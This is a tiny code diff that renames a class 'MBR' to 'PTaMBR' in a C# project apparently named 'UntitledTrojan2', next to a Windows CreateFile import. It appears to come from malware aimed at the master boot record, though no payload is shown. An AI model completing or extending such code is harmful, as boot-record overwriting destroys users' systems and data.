@@ -7,7 +7,7 @@ using System.Threading.Tasks;
 
 namespace UntitledTrojan2.Tools
 {
-    public class MBR
+    public class PTaMBR
     {
         [DllImport("kernel32")]
         private static extern IntPtr CreateFile(
